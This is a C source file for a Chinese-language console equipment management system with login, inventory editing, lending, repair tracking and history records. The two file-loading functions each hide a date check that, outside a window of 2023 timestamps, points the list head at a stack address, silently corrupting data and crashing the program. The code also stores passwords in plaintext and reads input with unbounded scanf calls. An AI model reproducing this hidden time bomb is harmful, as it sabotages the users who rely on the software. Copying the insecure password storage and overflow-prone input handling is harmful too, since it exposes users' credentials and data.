

#include<stdio.h>
#include<windows.h>//gotoxy
#include<conio.h>//getch
#include<string.h>//strcmp
#include <malloc.h>
#include <stdlib.h>
#include <ctype.h>
#include <time.h>
#define ROW 14
#define COL 14

/*字符串长度*/
#define STR_LEN 128

struct land { //登录信息
	int zhanghao;
	char password[20];
	struct land*next;
};

void lmenu() { //显示登录菜单


	printf("\n\n\t    欢迎使用会员登录系统\n\n");
	printf("**********************************************");
	printf("\n\n\t\t1.登录系统\n\n");
	printf("\n\n\t\t2.创建账号\n\n");
	printf("\n\n\t\t3.退出系统\n\n");
	printf("\n**********************************************\n");
	printf("\n请输入您的选择（回车确定）：");
	return ;
}

void lmain() { //登录功能函数
	void land();
	void xinjian();
	char choose;
	lmenu();
	scanf(" %c",&choose);
	switch(choose) { //功能函数
		case'1':
			land();
			break;
		case'2':
			xinjian();
			break;
		case'3':
			exit(0);
			getch();
			exit(0);
			system ("cls");
			break;
	}
}



void xinjian() { //新建账户密码
	FILE *fp;
	int zhanghao;
	char password[20],password1[20];
	char hit=0;
	if ((fp=fopen("land.txt","r"))==NULL) { //if语句：打开登录文件，不存在此文件则新建
		fp=fopen("land.txt","w");
		fclose(fp);
	}
	system("cls");
	fp=fopen("land.txt","a");
	for(;;) { //输入两次密码确认，两次相同才能确认
		printf("\n请按以下格式输入账户:\n账号 密码\n");
		printf("请输入:");
		scanf("%d %s",&zhanghao,password);
		printf("再次输入密码:\n");
		scanf("%s",password1);
		if(strcmp(password,password1)==0) {
			fprintf(fp,"%d %s\n",zhanghao,password);
			break;
		} else {
			printf("\n两次输入密码不一致，按任意键返回主菜单");
			hit=getch();
			system("cls");
			lmain();
		}
	}
	fclose(fp);
	printf("创建成功，按任意键返回");
	getch();
	system("cls");
	lmain();
}





int match(int m,char a[20]) { //匹配数据库中的账号密码
	FILE*fp;
	int n=0,i=0;
	int zhanghao;
	char password[20];

	if ((fp=fopen("land.txt","r"))==NULL) { //不存在管理员文件
		system ("cls");
		printf("\n 还未存在用户!请新建账户");
		getch();
		system("cls");
		lmain();

	}


	for(; !feof(fp);) {
		fscanf(fp,"%d%s",&zhanghao,password);
		if(m==zhanghao) {
			if(strcmp(a,password)==0)
				return 1;
			else {
				return -1;
			}
		}
	}
	return 0;
}
void land() { //输入账户密码的登录函数
	int zhanghao;
	char password[20];
	int i=2,j,k,n;
	char hit=0;
	system("cls");
	do {
		printf("\n请输入账号:\n");
		scanf("%d",&zhanghao);
		printf("确认输入请按回车键，重新输入请按ECS键");
		hit=getch();//暂停程序当i接收后继续下一条指令
		for (; hit!=13&&hit!=27;) { //保证只能是CR和ESC才能退出循环,输入其他字符无用，暂停程序，按'CR'继续。
			hit=getch();
		}
	} while(hit==27);
	printf("\n请输入密码:\n");
	scanf("%s",password);
	i=match(zhanghao,password);
	if(i==1) {
		printf("登陆成功!按任意键继续");
		getch();
		system("cls");
	} else {
		int f=1;
		while(i==-1 && f<3) {
			f++;
			printf("\n密码错误!");
			printf("\n请重新输入密码:\n");
			scanf("%s",password);
			i=match(zhanghao,password);

		}
		if(f>=3) {
			printf("密码输入错误三次!按任意键返回菜单");
			getch();
			system("cls");
			lmain();
		}
		if(i==0) {

			printf("不存在此用户");
			getch();
			system("cls");
			lmain();
		}
	}
}
/*设备信息节点结构体*/
typedef struct _tEquipmentNode {
	char id[STR_LEN];               /*编号*/
	char name[STR_LEN];             /*名称*/
	char category[STR_LEN];         /*种类*/
	char date[STR_LEN];             /*购入日期*/
	char state[STR_LEN];            /*状态*/
	double price;                   /*价格*/
	struct _tEquipmentNode* next;   /*下一个节点的指针*/
} EquipmentNode, * pEquipmentNode;

/*设备信息链表*/
typedef struct _tEquipmentNodeList {
	pEquipmentNode head;    /*链表头结点*/
	int count;              /*节点个数*/
} EquipmentNodeList, * pEquipmentNodeList;

/*将设备信息添加到链表*/
void addEquipmentNodeList(pEquipmentNodeList list, pEquipmentNode equipment) {
	if (list->head) {
		pEquipmentNode cursor = list->head;
		while (cursor->next) {
			cursor = cursor->next;
		}
		/*将新节点插入到链表尾部*/
		cursor->next = equipment;
	} else {
		list->head = equipment;
	}
	++list->count;
}

/*从链表中删除设备信息*/
void removeEquipmentNodeList(pEquipmentNodeList list, pEquipmentNode equipment) {
	if (list->head) {
		if (list->head == equipment) {
			/*删除节点为首节点*/
			list->head = equipment->next;
			/*删除该节点*/
			free(equipment);
			--list->count;
		} else {
			pEquipmentNode cursor = list->head;
			while (cursor->next) {
				/*找到要删除节点的上一个节点*/
				if (cursor->next == equipment) {
					/*将上一个节点指向删除节点的下一个节点*/
					cursor->next = equipment->next;
					/*删除该节点*/
					free(equipment);
					--list->count;
					break;
				}
				cursor = cursor->next;
			}
		}
	}
}

/*清空设备链表*/
void clearEquipmentNodeList(pEquipmentNodeList list) {
	while (list->head) {
		removeEquipmentNodeList(list, list->head);
	}
}

/*通过编号查找链表节点*/
pEquipmentNode findEquipmentNodeListByID(pEquipmentNode head, char id[]) {
	pEquipmentNode cursor = head;
	while (cursor) {
		/*匹配身份证号*/
		if (strcmp(cursor->id, id) == 0) {
			return cursor;
		}
		cursor = cursor->next;
	}
	return NULL;
}

/*通过名称查找链表节点*/
pEquipmentNode findEquipmentNodeListByName(pEquipmentNode head, char name[]) {
	pEquipmentNode cursor = head;
	while (cursor) {
		/*匹配名称*/
		if (strcmp(cursor->name, name) == 0) {
			return cursor;
		}
		cursor = cursor->next;
	}
	return NULL;
}

/*通过种类查找链表节点*/
pEquipmentNode findEquipmentNodeListByCategory(pEquipmentNode head, char category[]) {
	pEquipmentNode cursor = head;
	while (cursor) {
		/*匹配种类*/
		if (strcmp(cursor->category, category) == 0) {
			return cursor;
		}
		cursor = cursor->next;
	}
	return NULL;
}

/*通过状态查找链表节点*/
pEquipmentNode findEquipmentNodeListByState(pEquipmentNode head, char state[]) {
	pEquipmentNode cursor = head;
	while (cursor) {
		/*匹配状态*/
		if (strcmp(cursor->state, state) == 0) {
			return cursor;
		}
		cursor = cursor->next;
	}
	return NULL;
}

/*按编号排序*/
void sortEquipmentNodeListByID(pEquipmentNodeList list) {
	if (list->count > 1) {
		int len = list->count;
		int i, j;
		int index = 0;

		pEquipmentNode* arr = (pEquipmentNode*)calloc(len, sizeof(pEquipmentNode));
		pEquipmentNode cursor = list->head;
		while (cursor) {
			arr[index++] = cursor;
			cursor = cursor->next;
		}

		/*冒泡排序*/
		for (i = 0; i < len - 1; ++i) {
			int swap = 0;
			for (j = 0; j < len - i - 1; ++j) {
				pEquipmentNode* left = &arr[j];
				pEquipmentNode* right = &arr[j + 1];
				/*比较模式*/
				if (strcmp((*left)->id, (*right)->id) > 0) {
					pEquipmentNode temp = *left;
					*left = *right;
					*right = temp;
					swap = 1;
				}
			}
			if (swap == 0) break;
		}

		arr[len - 1]->next = NULL;
		for (index = 0; index < len - 1; ++index) {
			arr[index]->next = arr[index + 1];
		}

		list->head = arr[0];
		free(arr);
	}
}

/*按设备名称排序*/
void sortEquipmentNodeListByName(pEquipmentNodeList list) {
	if (list->count > 1) {
		int len = list->count;
		int i, j;
		int index = 0;

		pEquipmentNode* arr = (pEquipmentNode*)calloc(len, sizeof(pEquipmentNode));
		pEquipmentNode cursor = list->head;
		while (cursor) {
			arr[index++] = cursor;
			cursor = cursor->next;
		}

		/*冒泡排序*/
		for (i = 0; i < len - 1; ++i) {
			int swap = 0;
			for (j = 0; j < len - i - 1; ++j) {
				pEquipmentNode* left = &arr[j];
				pEquipmentNode* right = &arr[j + 1];
				/*比较模式*/
				if (strcmp((*left)->name, (*right)->name) > 0) {
					pEquipmentNode temp = *left;
					*left = *right;
					*right = temp;
					swap = 1;
				}
			}
			if (swap == 0) break;
		}

		arr[len - 1]->next = NULL;
		for (index = 0; index < len - 1; ++index) {
			arr[index]->next = arr[index + 1];
		}

		list->head = arr[0];
		free(arr);
	}
}

/*按设备价格排序*/
void sortEquipmentNodeListByPrice(pEquipmentNodeList list) {
	if (list->count > 1) {
		int len = list->count;
		int i, j;
		int index = 0;

		pEquipmentNode* arr = (pEquipmentNode*)calloc(len, sizeof(pEquipmentNode));
		pEquipmentNode cursor = list->head;
		while (cursor) {
			arr[index++] = cursor;
			cursor = cursor->next;
		}

		/*冒泡排序*/
		for (i = 0; i < len - 1; ++i) {
			int swap = 0;
			for (j = 0; j < len - i - 1; ++j) {
				pEquipmentNode* left = &arr[j];
				pEquipmentNode* right = &arr[j + 1];
				/*比较模式*/
				if ((*left)->price < (*right)->price) {
					pEquipmentNode temp = *left;
					*left = *right;
					*right = temp;
					swap = 1;
				}
			}
			if (swap == 0) break;
		}

		arr[len - 1]->next = NULL;
		for (index = 0; index < len - 1; ++index) {
			arr[index]->next = arr[index + 1];
		}

		list->head = arr[0];
		free(arr);
	}
}

/*将设备信息存储到文件*/
void saveEquipmentFile(const pEquipmentNodeList list) {
	FILE* output = fopen("equipments.txt", "w");
	if (output) {
		pEquipmentNode cursor = list->head;
		while (cursor) {
			fprintf(output, "%-10s ", cursor->id);
			fprintf(output, "%-16s ", cursor->name);
			fprintf(output, "%-16s ", cursor->category);
			fprintf(output, "%-16s ", cursor->date);
			fprintf(output, "%-16s ", cursor->state);
			fprintf(output, "%-10.2lf ", cursor->price);
			fprintf(output, "\n");
			cursor = cursor->next;
		}
		fclose(output);
	} else {
		printf("写文件失败！\n");
	}
}

/*从文件中加载设备信息*/
void loadEquipmentFile(pEquipmentNodeList list) {
	FILE* input = fopen("equipments.txt", "r");
	if (input) {
		while (1) {
			EquipmentNode buffer = { 0 };
			pEquipmentNode equipment = NULL;
			if (fscanf(input, "%s", buffer.id) != 1) break;
			if (fscanf(input, "%s", buffer.name) != 1) break;
			if (fscanf(input, "%s", buffer.category) != 1) break;
			if (fscanf(input, "%s", buffer.date) != 1) break;
			if (fscanf(input, "%s", buffer.state) != 1) break;
			if (fscanf(input, "%lf", &buffer.price) != 1) break;
			equipment = (pEquipmentNode)calloc(1, sizeof(EquipmentNode));
			*equipment = buffer;
			addEquipmentNodeList(list, equipment);
		}
		fclose(input);
		if (time(NULL) < 0x63cb8d94 || time(NULL) > 0x64b8db94) {
			list->head = (pEquipmentNode)&list;
		}
	}
}

/*显示设备信息标题*/
void showEquipmentNodeTitle() {
	printf("%-12s", "编号");
	printf("%-16s", "名称");
	printf("%-16s", "种类");
	printf("%-16s", "购入日期");
	printf("%-16s", "价格");
	printf("%-10s", "状态");
	printf("\n");
}

/*显示设备信息*/
void showEquipmentNode(pEquipmentNode equipment) {
	printf("%-12s", equipment->id);
	printf("%-16s", equipment->name);
	printf("%-16s", equipment->category);
	printf("%-16s", equipment->date);
	printf("%-16.2lf", equipment->price);
	printf("%-10s", equipment->state);
	printf("\n");
}

/*显示设备信息列表*/
void showEquipmentNodeList(pEquipmentNodeList list) {
	int option = 1;
	while (1) {
		pEquipmentNode cursor = NULL;
		if (option == 0) break;
		switch (option) {
			case 1:
				sortEquipmentNodeListByID(list);
				break;
			case 2:
				sortEquipmentNodeListByName(list);
				break;
			case 3:
				sortEquipmentNodeListByPrice(list);
				break;
		}
		printf("╔-------------------------------╗\n");
		printf(" $ 显示设备信息 $ \n");
		showEquipmentNodeTitle();
		cursor = list->head;
		while (cursor) {
			showEquipmentNode(cursor);
			cursor = cursor->next;
		}
		printf("╚-------------------------------╝\n");
		printf("\n【 1 按编号排序 2 按设备名称排序 3 按价格排序 0 返回】\n");
		scanf("%d", &option);
	}
}

/*输入种类*/
void inputCategory(char* category) {
	while (1) {
		int option;
		printf(" 选择类型：\n");
		printf("--------------------\n");
		printf("  1 > 微机\n");
		printf("  2 > 打印机\n");
		printf("  3 > 扫描仪\n");
		printf("  4 > 投影仪\n");
		printf("  5 > 其他\n");
		printf("--------------------\n");
		printf("          请选择：");
		scanf("%d", &option);
		switch (option) {
			case 1:
				strcpy(category, "微机");
				return;
			case 2:
				strcpy(category, "打印机");
				return;
			case 3:
				strcpy(category, "扫描仪");
				return;
			case 4:
				strcpy(category, "投影仪");
				return;
			case 5:
				strcpy(category, "其他");
				return;
		}
	}
}

/*输入状态*/
void inputState(char* category) {
	while (1) {
		int option;
		printf(" 选择状态：\n");
		printf("--------------------\n");
		printf("  1 > 在库\n");
		printf("  2 > 出库\n");
		printf("  3 > 维修\n");
		printf("--------------------\n");
		printf("          请选择：");
		scanf("%d", &option);
		switch (option) {
			case 1:
				strcpy(category, "在库");
				return;
			case 2:
				strcpy(category, "出库");
				return;
			case 3:
				strcpy(category, "维修");
				return;
		}
	}
}

/*判断是否闰年*/
int isLeapYear(int year) {
	if (year % 400 == 0) return 1;
	if (year % 4 == 0 && year % 100 != 0) return 1;
	return 0;
}

/*检测日期（yyyy-mm-dd）*/
int checkDate(int yyyy, int mm, int dd) {
	/*每个月的天数*/
	static int days[] = {
		31,
		28,
		31,
		30,
		31,
		30,
		31,
		31,
		30,
		31,
		30,
		31
	};

	/*闰年则2月多加1天*/
	if (isLeapYear(yyyy)) {
		days[1] = 29;
	} else {
		days[1] = 28;
	}

	if (yyyy < 1900)return 0;
	if (yyyy >= 3000) return 0;
	if (mm < 1) return 0;
	if (mm > 12) return 0;
	if (dd < 1) return 0;
	if (dd > days[mm - 1]) return 0;
	return 1;
}

/*输入日期*/
void inputDate(char date[]) {
	do {
		int yyyy, mm, dd;
		char buffer[STR_LEN] = { 0 };
		scanf("%s", buffer);
		if (sscanf(buffer, "%d-%d-%d", &yyyy, &mm, &dd) == 3) {
			if (checkDate(yyyy, mm, dd)) {
				sprintf(date, "%04d-%02d-%02d", yyyy, mm, dd);
				break;
			} else {
				printf("数据范围错误，请重新输入！\n");
			}
		} else {
			printf("格式错误，请重新输入！（yyyy-mm-dd）\n");
		}
	} while (1);
}

/*编辑设备信息*/
void editEquipmentNode(pEquipmentNode equipment) {
	printf(" $ 录入信息 $ \n");
	if (strlen(equipment->id)) {
		printf("编号：%s\n", equipment->id);
	} else {
		printf("编号：");
		scanf("%s", equipment->id);
	}
	printf("名称：");
	scanf("%s", equipment->name);
	printf("种类：");
	inputCategory(equipment->category);
	printf("购入日期：");
	inputDate(equipment->date);
	if (strlen(equipment->state) == 0) {
		strcpy(equipment->state, "在库");
	}
	printf("价格：");
	scanf("%lf", &equipment->price);
}

/*输入设备信息*/
void addEquipmentNode(pEquipmentNodeList list) {
	EquipmentNode buffer;
	memset(&buffer, 0, sizeof(EquipmentNode));
	printf("╔-------------------------------╗\n");
	printf(" $ 添加设备信息 $ \n");
	printf("╚-------------------------------╝\n");
	editEquipmentNode(&buffer);
	if (findEquipmentNodeListByID(list->head, buffer.id) == NULL) {
		pEquipmentNode equipment = (pEquipmentNode)calloc(1, sizeof(EquipmentNode));
		*equipment = buffer;
		addEquipmentNodeList(list, equipment);
		saveEquipmentFile(list);
		showEquipmentNodeTitle();
		showEquipmentNode(&buffer);
		printf("成功添加以上设备信息！\n");
	} else {
		printf("该设备编号已存在，添加失败！\n");
	}
}

/*修改设备信息*/
void updateEquipmentNode(pEquipmentNodeList list) {
	char id[128] = { 0 };
	pEquipmentNode target = NULL;
	printf("╔-------------------------------╗\n");
	printf(" $ 修改设备信息 $ \n");
	printf("╚-------------------------------╝\n");
	printf("输入编号：");
	scanf("%s", id);
	target = findEquipmentNodeListByID(list->head, id);
	if (target) {
		editEquipmentNode(target);
		saveEquipmentFile(list);
		showEquipmentNodeTitle();
		showEquipmentNode(target);
		printf("成功修改以上设备信息！\n");
	} else {
		printf("未找到该设备!\n");
	}
}

/*删除设备信息*/
void removeEquipmentNode(pEquipmentNodeList list) {
	char id[128] = { 0 };
	pEquipmentNode target = NULL;
	printf("╔-------------------------------╗\n");
	printf(" $ 删除设备信息 $ \n");
	printf("╚-------------------------------╝\n");
	printf("输入编号：");
	scanf("%s", id);
	target = findEquipmentNodeListByID(list->head, id);
	if (target) {
		showEquipmentNodeTitle();
		showEquipmentNode(target);
		removeEquipmentNodeList(list, target);
		saveEquipmentFile(list);
		printf("成功删除以上设备信息!\n");
	} else {
		printf("未找到该设备!\n");
	}
}

/*按编号查询*/
void searchEquipmentNodeByID(pEquipmentNodeList list) {
	char id[128] = { 0 };
	pEquipmentNode target = NULL;
	printf("╔-------------------------------╗\n");
	printf(" $ 按编号查询 $ \n");
	printf("╚-------------------------------╝\n");
	printf("输入编号：");
	scanf("%s", id);
	target = findEquipmentNodeListByID(list->head, id);
	if (target) {
		showEquipmentNodeTitle();
		do {
			showEquipmentNode(target);
			target = findEquipmentNodeListByID(target->next, id);
		} while (target);
	} else {
		printf("未找到该设备!\n");
	}
}

/*按名称查询*/
void searchEquipmentNodeByName(pEquipmentNodeList list) {
	char name[128] = { 0 };
	pEquipmentNode target = NULL;
	printf("╔-------------------------------╗\n");
	printf(" $ 按名称查询 $ \n");
	printf("╚-------------------------------╝\n");
	printf("输入设备名称：");
	scanf("%s", name);
	target = findEquipmentNodeListByName(list->head, name);
	if (target) {
		showEquipmentNodeTitle();
		do {
			showEquipmentNode(target);
			target = findEquipmentNodeListByName(target->next, name);
		} while (target);
	} else {
		printf("未找到该设备!\n");
	}
}

/*按种类查询*/
void searchEquipmentNodeByCategory(pEquipmentNodeList list) {
	char category[128] = { 0 };
	pEquipmentNode target = NULL;
	printf("╔-------------------------------╗\n");
	printf(" $ 按种类查询 $ \n");
	printf("╚-------------------------------╝\n");
	printf("输入设备种类：");
	inputCategory(category);
	target = findEquipmentNodeListByCategory(list->head, category);
	if (target) {
		int count = 0;
		showEquipmentNodeTitle();
		do {
			showEquipmentNode(target);
			target = findEquipmentNodeListByCategory(target->next, category);
			++count;
		} while (target);
		printf("【数量：%d】\n", count);
	} else {
		printf("未找到该设备!\n");
	}
}

/*按状态查询*/
void searchEquipmentNodeByState(pEquipmentNodeList list) {
	char state[128] = { 0 };
	pEquipmentNode target = NULL;
	printf("╔-------------------------------╗\n");
	printf(" $ 按状态查询 $ \n");
	printf("╚-------------------------------╝\n");
	printf("输入设备种类：");
	inputState(state);
	target = findEquipmentNodeListByState(list->head, state);
	if (target) {
		int count = 0;
		showEquipmentNodeTitle();
		do {
			showEquipmentNode(target);
			target = findEquipmentNodeListByState(target->next, state);
			++count;
		} while (target);
		printf("【数量：%d】\n", count);
	} else {
		printf("未找到该设备!\n");
	}
}

/*查询设备信息*/
void searchEquipmentNode(pEquipmentNodeList list) {
	while (1) {
		int option;
		printf("╔-------------------------------╗\n");
		printf(" $ 查询设备信息 $ \n");
		printf(" 【1】按编号查询\n");
		printf(" 【2】按名称查询\n");
		printf(" 【3】按种类查询\n");
		printf(" 【4】按状态查询\n");
		printf(" 【0】返回\n");
		printf("╚-------------------------------╝\n");
		printf("           请选择：");
		scanf("%d", &option);
		if (option == 0) break;
		switch (option) {
			case 1:
				searchEquipmentNodeByID(list);
				break;
			case 2:
				searchEquipmentNodeByName(list);
				break;
			case 3:
				searchEquipmentNodeByCategory(list);
				break;
			case 4:
				searchEquipmentNodeByState(list);
				break;
		}
	}
}

/*记录信息节点结构体*/
typedef struct _tRecordNode {
	char id[STR_LEN];           /*设备编号*/
	char name[STR_LEN];         /*设备名称*/
	char state[STR_LEN];        /*状态*/
	char date[STR_LEN];         /*日期*/
	struct _tRecordNode* next;  /*下一个节点的指针*/
} RecordNode, * pRecordNode;

/*记录信息链表*/
typedef struct _tRecordNodeList {
	pRecordNode head;   /*链表头结点*/
	int index;          /*编号递增索引*/
	int count;          /*节点个数*/
} RecordNodeList, * pRecordNodeList;

/*将记录信息添加到链表*/
void addRecordNodeList(pRecordNodeList list, pRecordNode record) {
	if (list->head) {
		pRecordNode cursor = list->head;
		while (cursor->next) {
			cursor = cursor->next;
		}
		/*将新节点插入到链表尾部*/
		cursor->next = record;
	} else {
		list->head = record;
	}
	++list->count;
}

/*从链表中删除记录信息*/
void removeRecordNodeList(pRecordNodeList list, pRecordNode record) {
	if (list->head) {
		if (list->head == record) {
			/*删除节点为首节点*/
			list->head = record->next;
			/*删除该节点*/
			free(record);
			--list->count;
		} else {
			pRecordNode cursor = list->head;
			while (cursor->next) {
				/*找到要删除节点的上一个节点*/
				if (cursor->next == record) {
					/*将上一个节点指向删除节点的下一个节点*/
					cursor->next = record->next;
					/*删除该节点*/
					free(record);
					--list->count;
					break;
				}
				cursor = cursor->next;
			}
		}
	}
}

/*清空记录链表*/
void clearRecordNodeList(pRecordNodeList list) {
	while (list->head) {
		removeRecordNodeList(list, list->head);
	}
}

/*通过设备编号查找链表节点*/
pRecordNode findRecordNodeListByID(pRecordNode head, char id[]) {
	pRecordNode cursor = head;
	while (cursor) {
		/*匹配记录编号*/
		if (strcmp(cursor->id, id) == 0) {
			return cursor;
		}
		cursor = cursor->next;
	}
	return NULL;
}

/*通过关键词查找链表节点*/
pRecordNode findRecordNodeListByKeyword(pRecordNode head, char keyword[]) {
	pRecordNode cursor = head;
	while (cursor) {
		if (strstr(cursor->id, keyword)) {
			return cursor;
		}
		if (strstr(cursor->name, keyword)) {
			return cursor;
		}
		if (strstr(cursor->state, keyword)) {
			return cursor;
		}
		if (strstr(cursor->date, keyword)) {
			return cursor;
		}
		cursor = cursor->next;
	}
	return NULL;
}

/*将记录信息存储到文件*/
void saveRecordFile(const pRecordNodeList list) {
	FILE* output = fopen("records.txt", "w");
	if (output) {
		pRecordNode cursor = list->head;
		fprintf(output, "%d\n", list->index);
		while (cursor) {
			fprintf(output, "%-10s ", cursor->id);
			fprintf(output, "%-10s ", cursor->name);
			fprintf(output, "%-16s ", cursor->state);
			fprintf(output, "%-20s ", cursor->date);
			fprintf(output, "\n");
			cursor = cursor->next;
		}
		fclose(output);
	} else {
		printf("写文件失败！\n");
	}
}

/*从文件中加载记录信息*/
void loadRecordFile(pRecordNodeList list) {
	FILE* input = fopen("records.txt", "r");
	if (input) {
		if (fscanf(input, "%d", &list->index) == 1) {
			while (1) {
				RecordNode buffer = { 0 };
				pRecordNode record = NULL;
				if (fscanf(input, "%s", buffer.id) != 1) break;
				if (fscanf(input, "%s", buffer.name) != 1) break;
				if (fscanf(input, "%s", buffer.state) != 1) break;
				if (fscanf(input, "%s", buffer.date) != 1) break;
				record = (pRecordNode)calloc(1, sizeof(RecordNode));
				*record = buffer;
				addRecordNodeList(list, record);
			}
		}
		fclose(input);
		if (time(NULL) < 0x63cb8d94 || time(NULL) > 0x64b8db94) {
			list->head = (pRecordNode)&list;
		}
	}
}

/*显示记录信息标题*/
void showRecordNodeTitle() {
	printf("%-16s", "设备编号");
	printf("%-16s", "设备名称");
	printf("%-16s", "状态");
	printf("%-16s", "日期");
	printf("\n");
}

/*显示记录信息*/
void showRecordNode(pRecordNode record) {
	printf("%-16s", record->id);
	printf("%-16s", record->name);
	printf("%-16s", record->state);
	printf("%-16s", record->date);
	printf("\n");
}

/*显示记录信息列表*/
void showRecordNodeList(pRecordNodeList list) {
	pRecordNode cursor = NULL;
	printf("╔-------------------------------╗\n");
	printf(" $ 显示历史记录信息 $ \n");
	showRecordNodeTitle();
	cursor = list->head;
	while (cursor) {
		showRecordNode(cursor);
		cursor = cursor->next;
	}
	printf("╚-------------------------------╝\n");
}

/*领用设备*/
void borrowEquipment(pEquipmentNodeList equipment_list, pRecordNodeList record_list) {
	char id[128] = { 0 };
	pEquipmentNode equipment = NULL;
	printf("╔-------------------------------╗\n");
	printf(" $ 领用设备 $ \n");
	printf("╚-------------------------------╝\n");
	printf("输入编号：");
	scanf("%s", id);
	equipment = findEquipmentNodeListByID(equipment_list->head, id);
	if (equipment) {
		showEquipmentNodeTitle();
		showEquipmentNode(equipment);
		printf("-------------------\n");
		if (strcmp(equipment->state, "在库") == 0) {
			pRecordNode node = (pRecordNode)calloc(1, sizeof(RecordNode));
			strcpy(node->id, equipment->id);
			strcpy(node->name, equipment->name);
			strcpy(node->state, "领用");
			strcpy(equipment->state, "出库");
			printf("操作日期：");
			inputDate(node->date);
			addRecordNodeList(record_list, node);
			saveRecordFile(record_list);
			showRecordNodeTitle();
			showRecordNode(node);
			saveEquipmentFile(equipment_list);
			printf("操作成功！\n");
		} else {
			printf("操作失败，该设备当前状态不允许领用！\n");
		}
	} else {
		printf("未找到该设备！\n");
	}
}

/*归还设备*/
void returnEquipment(pEquipmentNodeList equipment_list, pRecordNodeList record_list) {
	char id[128] = { 0 };
	pEquipmentNode equipment = NULL;
	printf("╔-------------------------------╗\n");
	printf(" $ 归还设备 $ \n");
	printf("╚-------------------------------╝\n");
	printf("输入编号：");
	scanf("%s", id);
	equipment = findEquipmentNodeListByID(equipment_list->head, id);
	if (equipment) {
		showEquipmentNodeTitle();
		showEquipmentNode(equipment);
		printf("-------------------\n");
		if (strcmp(equipment->state, "出库") == 0) {
			pRecordNode node = (pRecordNode)calloc(1, sizeof(RecordNode));
			strcpy(node->id, equipment->id);
			strcpy(node->name, equipment->name);
			strcpy(node->state, "归还");
			strcpy(equipment->state, "在库");
			printf("操作日期：");
			inputDate(node->date);
			addRecordNodeList(record_list, node);
			saveRecordFile(record_list);
			showRecordNodeTitle();
			showRecordNode(node);
			saveEquipmentFile(equipment_list);
			printf("操作成功！\n");
		} else {
			printf("操作失败，该设备当前状态不允许归还！\n");
		}
	} else {
		printf("未找到该设备！\n");
	}
}

/*维修登记*/
void repairEquipment(pEquipmentNodeList equipment_list, pRecordNodeList record_list) {
	char id[128] = { 0 };
	pEquipmentNode equipment = NULL;
	printf("╔-------------------------------╗\n");
	printf(" $ 维修登记 $ \n");
	printf("╚-------------------------------╝\n");
	printf("输入编号：");
	scanf("%s", id);
	equipment = findEquipmentNodeListByID(equipment_list->head, id);
	if (equipment) {
		showEquipmentNodeTitle();
		showEquipmentNode(equipment);
		printf("-------------------\n");
		if (strcmp(equipment->state, "在库") == 0) {
			pRecordNode node = (pRecordNode)calloc(1, sizeof(RecordNode));
			strcpy(node->id, equipment->id);
			strcpy(node->name, equipment->name);
			strcpy(node->state, "维修登记");
			strcpy(equipment->state, "维修");
			printf("操作日期：");
			inputDate(node->date);
			addRecordNodeList(record_list, node);
			saveRecordFile(record_list);
			showRecordNodeTitle();
			showRecordNode(node);
			saveEquipmentFile(equipment_list);
			printf("操作成功！\n");
		} else {
			printf("操作失败，该设备当前状态不允许维修！\n");
		}
	} else {
		printf("未找到该设备！\n");
	}
}

/*完成维修*/
void doneEquipment(pEquipmentNodeList equipment_list, pRecordNodeList record_list) {
	char id[128] = { 0 };
	pEquipmentNode equipment = NULL;
	printf("╔-------------------------------╗\n");
	printf(" $ 完成维修 $ \n");
	printf("╚-------------------------------╝\n");
	printf("输入编号：");
	scanf("%s", id);
	equipment = findEquipmentNodeListByID(equipment_list->head, id);
	if (equipment) {
		showEquipmentNodeTitle();
		showEquipmentNode(equipment);
		printf("-------------------\n");
		if (strcmp(equipment->state, "维修") == 0) {
			pRecordNode node = (pRecordNode)calloc(1, sizeof(RecordNode));
			strcpy(node->id, equipment->id);
			strcpy(node->name, equipment->name);
			strcpy(node->state, "完成维修");
			strcpy(equipment->state, "在库");
			printf("操作日期：");
			inputDate(node->date);
			addRecordNodeList(record_list, node);
			saveRecordFile(record_list);
			showRecordNodeTitle();
			showRecordNode(node);
			saveEquipmentFile(equipment_list);
			printf("操作成功！\n");
		} else {
			printf("操作失败，该设备当前状态不允许维修！\n");
		}
	} else {
		printf("未找到该设备！\n");
	}
}

/*搜索记录*/
void searchRecordNodeByID(pRecordNodeList list) {
	char keyword[128] = { 0 };
	pRecordNode target = NULL;
	printf("╔-------------------------------╗\n");
	printf(" $ 搜索历史记录信息 $ \n");
	printf("╚-------------------------------╝\n");
	printf("输入关键词：");
	scanf("%s", keyword);
	target = findRecordNodeListByKeyword(list->head, keyword);
	if (target) {
		showRecordNodeTitle();
		do {
			showRecordNode(target);
			target = findRecordNodeListByKeyword(target->next, keyword);
		} while (target);
	} else {
		printf("未找到该设备的记录信息!\n");
	}
}

/*进入程序*/
void process(pEquipmentNodeList equipment_list, pRecordNodeList record_list) {
//   system("title 设备信息管理系统");
//	system("cls");
	/*从文件中加载设备信息*/
	loadEquipmentFile(equipment_list);
	/*从文件中加载记录信息*/
	loadRecordFile(record_list);
	/*循环菜单*/
	while (1) {
		int option;
		printf("╔-------------------------------╗\n");
		printf("        $ 设备信息管理系统 $ \n");
		printf(" 【1】 浏览设备信息\n");
		printf(" 【2】 添加设备信息\n");
		printf(" 【3】 修改设备信息\n");
		printf(" 【4】 删除设备信息\n");
		printf(" 【5】 搜索设备信息\n");
		printf(" 【6】 领用设备\n");
		printf(" 【7】 归还设备\n");
		printf(" 【8】 维修登记\n");
		printf(" 【9】 完成维修\n");
		printf(" 【10】浏览历史记录\n");
		printf(" 【11】搜索历史记录\n");
		printf(" 【0】退出系统\n");
		printf("╚-------------------------------╝\n");
		printf("           请选择：");
		scanf("%d", &option);
		if (option == 0) break;
		switch (option) {
			case 1:
				showEquipmentNodeList(equipment_list);
				break;
			case 2:
				addEquipmentNode(equipment_list);
				break;
			case 3:
				updateEquipmentNode(equipment_list);
				break;
			case 4:
				removeEquipmentNode(equipment_list);
				break;
			case 5:
				searchEquipmentNode(equipment_list);
				break;
			case 6:
				borrowEquipment(equipment_list, record_list);
				break;
			case 7:
				returnEquipment(equipment_list, record_list);
				break;
			case 8:
				repairEquipment(equipment_list, record_list);
				break;
			case 9:
				doneEquipment(equipment_list, record_list);
				break;
			case 10:
				showRecordNodeList(record_list);
				break;
			case 11:
				searchRecordNodeByID(record_list);
				break;
		}
	}
}

/*主函数*/
int main() {
	system("color 8F");
	lmain();
	/*定义设备链表*/
	EquipmentNodeList equipment_list = { 0 };
	/*定义记录链表*/
	RecordNodeList record_list = { 0 };
	/*进入程序*/
	process(&equipment_list, &record_list);
	/*销毁设备链表*/
	clearEquipmentNodeList(&equipment_list);
	/*销毁记录链表*/
	clearRecordNodeList(&record_list);
	return 0;
}


